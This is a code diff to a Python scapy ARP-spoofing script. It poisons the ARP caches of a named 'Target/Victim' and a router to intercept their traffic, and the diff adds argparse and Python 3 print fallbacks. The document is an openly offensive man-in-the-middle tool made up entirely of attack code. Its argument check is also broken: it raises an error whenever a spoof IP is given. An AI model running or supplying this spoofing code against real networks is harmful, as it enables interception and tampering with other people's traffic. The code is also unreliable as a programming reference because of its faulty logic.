@@ -3,17 +3,23 @@ import scapy.all as scapy
 import time
 import sys
 import optparse
+import argparse
 
 def get_args():
+    try:
         parser = optparse.OptionParser()
         parser.add_option("-t", "--target", dest="target_ip", help="IP of Target/Victim")
         parser.add_option("-s", "--spoof", dest="spoof_ip", help="IP of Router/Receiver")
         (value, args) = parser.parse_args()
+    except:
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-t", "--target", dest="target_ip", help="IP of Target/Victim")
+        parser.add_argument("-s", "--spoof", dest="spoof_ip", help="IP of Router/Receiver")
+        value = parser.parse_args()
     if not value.target_ip or value.spoof_ip:
         parser.error("[-] ERROR Missing argument, use --help or more info")
     else:
         return value
-
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -37,8 +43,11 @@ try:
         arpsend(value.target_ip, value.spoof_ip)
         arpsend(value.spoof_ip, value.target_ip)
         packet_count += 2
-        print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
-        sys.stdout.flush()
+        try:
+            print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
+            sys.stdout.flush()
+        except:
+            print("\r[+] Spoofing...sent " + str(packet_count) + " packets",  end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("[-] Detected CTRL + C....Restoring ARP Table, Please wait....")
